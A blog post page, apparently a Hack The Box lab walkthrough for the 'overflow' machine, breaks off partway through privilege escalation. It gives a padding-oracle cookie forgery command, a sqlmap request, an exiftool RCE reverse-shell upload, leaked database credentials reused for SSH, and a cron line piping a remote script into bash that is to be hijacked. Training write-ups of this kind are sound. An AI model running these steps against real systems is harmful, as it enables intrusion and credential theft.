@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="introduceOS:	 LinuxDifficulty:	HardPoints:	40Release:	23 Oct 2021IP:	10.10.11.119">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hack-The-Box-walkthrough[overflow]">
+<meta property="og:url" content="https://fdlucifer.github.io/2022/03/11/overflow/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="introduceOS:	 LinuxDifficulty:	HardPoints:	40Release:	23 Oct 2021IP:	10.10.11.119">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2171.jpg">
+<meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2172.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2173.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2174.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2175.jpg">
+<meta property="article:published_time" content="2022-03-11T14:03:10.000Z">
+<meta property="article:modified_time" content="2022-04-09T15:52:42.638Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="HackTheBox靶机练习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2171.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2022/03/11/overflow/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2022/03/11/overflow/","path":"2022/03/11/overflow/","title":"Hack-The-Box-walkthrough[overflow]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Hack-The-Box-walkthrough[overflow] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#introduce"><span class="nav-number">1.</span> <span class="nav-text">introduce</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Enumeration"><span class="nav-number">2.</span> <span class="nav-text">Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#NMAP"><span class="nav-number">2.1.</span> <span class="nav-text">NMAP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#80-http"><span class="nav-number">2.2.</span> <span class="nav-text">80 - http</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Access-as-tester-user"><span class="nav-number">2.3.</span> <span class="nav-text">Access as tester user</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#tester-gt-root-user"><span class="nav-number">3.</span> <span class="nav-text">tester -&gt; root user</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Summary-of-knowledge"><span class="nav-number">4.</span> <span class="nav-text">Summary of knowledge</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Contact-me"><span class="nav-number">5.</span> <span class="nav-text">Contact me</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2022/03/11/overflow/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Hack-The-Box-walkthrough[overflow] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hack-The-Box-walkthrough[overflow]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-03-11 22:03:10" itemprop="dateCreated datePublished" datetime="2022-03-11T22:03:10+08:00">2022-03-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-04-09 23:52:42" itemprop="dateModified" datetime="2022-04-09T23:52:42+08:00">2022-04-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/HackTheBox-walkthrough/" itemprop="url" rel="index"><span itemprop="name">HackTheBox walkthrough</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h1><p>OS:	 Linux<br>Difficulty:	Hard<br>Points:	40<br>Release:	23 Oct 2021<br>IP:	10.10.11.119</p>
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2171.jpg"></p>
+</li>
+<li><p><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></p>
+</li>
+</ul>
+<span id="more"></span>
+
+<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/overflow]</span><br><span class="line">└─<span class="comment"># nmap -sV -v -p- -Pn --min-rate=10000 10.10.11.119</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">25/tcp open  smtp    Postfix smtpd</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">Service Info: Host:  overflow; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<p>If you do a nmap scan against the box ip, you will find three ports open 22, 25 and 80.</p>
+<h2 id="80-http"><a href="#80-http" class="headerlink" title="80 - http"></a>80 - http</h2><p>Go to <span class="exturl" data-url="aHR0cDovLzEwLjEwLjExLjExOS8=">http://10.10.11.119/<i class="fa fa-external-link-alt"></i></span> and you will see a website.</p>
+<p>Go to <span class="exturl" data-url="aHR0cDovLzEwLjEwLjExLjExOS9yZWdpc3Rlci5waHA=">http://10.10.11.119/register.php<i class="fa fa-external-link-alt"></i></span> and register for an account. And then login with those created credentials.</p>
+<p>In the homepage, do inspect and go to Storage. There, you will find a cookie which is vulnerable to oracle padding attack.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: auth=EchgxUSqB7AMH7COmJfenPjpe0%2BDlJRZ</span><br></pre></td></tr></table></figure>
+
+<p>Clone this repo <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0FvbkN5YmVyTGFicy9QYWRCdXN0ZXI=">PadBuster<i class="fa fa-external-link-alt"></i></span> to your machine.</p>
+<p>or just run:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install padbuster</span><br></pre></td></tr></table></figure>
+
+<p>To exploit it, run it like below:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">padbuster http://10.10.11.119 EchgxUSqB7AMH7COmJfenPjpe0%2BDlJRZ 8 -cookie auth=EchgxUSqB7AMH7COmJfenPjpe0%2BDlJRZ -plaintext user=admin</span><br></pre></td></tr></table></figure>
+
+<p>You will get the admin cookie: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA Change the cookie with this cookie and you will get admin access.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2172.jpg"></li>
+</ul>
+<p>There is sqli vulnerability if you go to</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.11.119/home/logs.php?name=admin</span><br></pre></td></tr></table></figure>
+
+<p>Open burpsuite and capture the request, send it to repeater and copy it to a file to perform sqlmap.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /home/logs.php?name=admin HTTP/1.1</span><br><span class="line">Host: 10.10.11.119</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: auth=BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA; CMSSESSIDf25decdf38ae=l8s6fp07ip0spm3fles18c1s84</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure>
+
+<p>You will find three databases:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/overflow]</span><br><span class="line">└─<span class="comment"># sqlmap -r sql.txt --dbs</span></span><br><span class="line"></span><br><span class="line">[09:58:52] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Linux Ubuntu 18.04 (bionic)</span><br><span class="line">web application technology: Apache 2.4.29</span><br><span class="line">back-end DBMS: MySQL 5</span><br><span class="line">[09:58:52] [INFO] fetching database names</span><br><span class="line">available databases [4]:</span><br><span class="line">[*] cmsmsdb</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] logs</span><br><span class="line">[*] Overflow</span><br></pre></td></tr></table></figure>
+
+<p>If you go through Overflow and cmsmsdb database, you will find there is a subdomain named devbuild-job.overflow.htb.</p>
+<p>Go to &#x2F;etc&#x2F;hosts file</p>
+<p>Now, go to <span class="exturl" data-url="aHR0cDovL2RldmJ1aWxkLWpvYi5vdmVyZmxvdy5odGIv">http://devbuild-job.overflow.htb/<i class="fa fa-external-link-alt"></i></span> and you will see a webpage:</p>
+<p>If you go to &#x2F;home&#x2F;profile, you can bypass the login.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://devbuild-job.overflow.htb/home/profile/</span><br></pre></td></tr></table></figure>
+
+<p>This Upload Resume option is using exiftool which is vulnerable to Remote Code Execution.</p>
+<p>To fetch the working POC, clone this repo <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NvbnZpc29sYWJzL0NWRS0yMDIxLTIyMjA0LWV4aWZ0b29s">CVE-2021-22204-exiftool<i class="fa fa-external-link-alt"></i></span>.</p>
+<p>Then run the below command:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install djvulibre-bin exiftool</span><br></pre></td></tr></table></figure>
+
+<p>Now inside that repo, you will find a python script named exploit.py. Open that file and edit the ip and port to your choice in which you will have to listen for a reverse shell.</p>
+<p>Start your netcat listener!</p>
+<p>Run the exploit.py file and it will create a malicious image.jpg in the current directory.</p>
+<p>Now upload that image.jpg into the resume and you will get a reverse shell back.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/CVE-2021-22204-exiftool]</span><br><span class="line">└─<span class="comment"># python3 exploit.py                                </span></span><br><span class="line">    1 image files updated</span><br><span class="line">                                                                                                                                    </span><br><span class="line">┌──(root💀kali)-[~/CVE-2021-22204-exiftool]</span><br><span class="line">└─<span class="comment"># ls</span></span><br><span class="line">configfile  exploit.djvu  exploit.py  image.jpg  image.jpg_original  lab  payload  payload.bzz  README.md</span><br></pre></td></tr></table></figure>
+
+<p>To make it a better tty shell, do the following:</p>
+<ol>
+<li>python3 -c “import pty; pty.spawn(‘&#x2F;bin&#x2F;bash’)”</li>
+<li>Ctrl + Z</li>
+<li>stty raw -echo;fg</li>
+<li>reset</li>
+<li>screen</li>
+<li>export TERM&#x3D;xterm</li>
+</ol>
+<p>but we can’t read user flag directly</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@overflow:/home$ <span class="built_in">cat</span> tester/user.txt </span><br><span class="line"><span class="built_in">cat</span>: tester/user.txt: Permission denied</span><br><span class="line">www-data@overflow:/home$</span><br></pre></td></tr></table></figure>
+
+<p>SSH as developer Now, if you go to &#x2F;var&#x2F;www&#x2F;html&#x2F;config, you will find a file named db.php.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">www-data@overflow:/home$ <span class="built_in">cat</span> /var/www/html/config/db.php </span><br><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"><span class="comment">#define(&#x27;DB_Server&#x27;, &#x27;localhost&#x27;);</span></span><br><span class="line"><span class="comment">#define(&#x27;DB_Username&#x27;, &#x27;root&#x27;);</span></span><br><span class="line"><span class="comment">#define(&#x27;DB_Password&#x27;,&#x27;root&#x27;);</span></span><br><span class="line"><span class="comment">#define(&#x27;DB_Name&#x27;, &#x27;Overflow&#x27;);</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$lnk</span> = mysqli_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;developer&quot;</span>, <span class="string">&quot;sh@tim@n&quot;</span>,<span class="string">&quot;Overflow&quot;</span>);</span><br><span class="line"><span class="variable">$db</span> = mysqli_select_db(<span class="variable">$lnk</span>,<span class="string">&quot;Overflow&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$db</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">    <span class="built_in">dir</span>(<span class="string">&#x27;Cannot Connect to Database&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Now you can ssh as developer with password: sh@tim@n</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/overflow]</span><br><span class="line">└─<span class="comment"># ssh developer@10.10.11.119                                                                                                      </span></span><br><span class="line">The authenticity of host <span class="string">&#x27;10.10.11.119 (10.10.11.119)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:u34uNgEoUmZK0MiCLEYEHIf4Uc+i2Zb6noKZy4YUgw8.</span></span><br><span class="line"><span class="string">This key is not known by any other names</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>10.10.11.119<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">developer@10.10.11.119&#x27;</span>s password: </span><br><span class="line">Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-159-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Fri Mar 11 20:42:05 IST 2022</span><br><span class="line"></span><br><span class="line">  System load:  0.0               Processes:           175</span><br><span class="line">  Usage of /:   45.1% of 5.84GB   Users logged <span class="keyword">in</span>:     0</span><br><span class="line">  Memory usage: 11%               IP address <span class="keyword">for</span> eth0: 10.10.11.119</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0 updates can be applied immediately.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-sh: 28: <span class="built_in">set</span>: Illegal option -o <span class="built_in">history</span></span><br><span class="line">-sh: 1: <span class="built_in">set</span>: Illegal option -o <span class="built_in">history</span></span><br><span class="line">$ <span class="built_in">id</span></span><br><span class="line">uid=1001(developer) gid=1001(developer) <span class="built_in">groups</span>=1001(developer),1002(network)</span><br><span class="line">$ <span class="built_in">whoami</span></span><br><span class="line">developer</span><br></pre></td></tr></table></figure>
+
+<h2 id="Access-as-tester-user"><a href="#Access-as-tester-user" class="headerlink" title="Access as tester user"></a>Access as tester user</h2><p>Now, go to &#x2F;opt folder, you will see a file named commontask.sh which is running every minute.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /opt/commontask.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#make sure its running every minute.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bash &lt; &lt;(curl -s http://taskmanage.overflow.htb/task.sh)</span><br></pre></td></tr></table></figure>
+
+<p>To exploit it, you will have to create a task.sh file in your local machine which contains a bash tcp reverse shell.</p>
+<p>And on the overflow box, you will have to edit the &#x2F;etc&#x2F;hosts. </p>
+<p>You are a member of the network group that’s why you can edit the &#x2F;etc&#x2F;hosts file.</p>
+<p>First, do the below:</p>
+<p>Create a task.sh file in your machine’s current directory.</p>
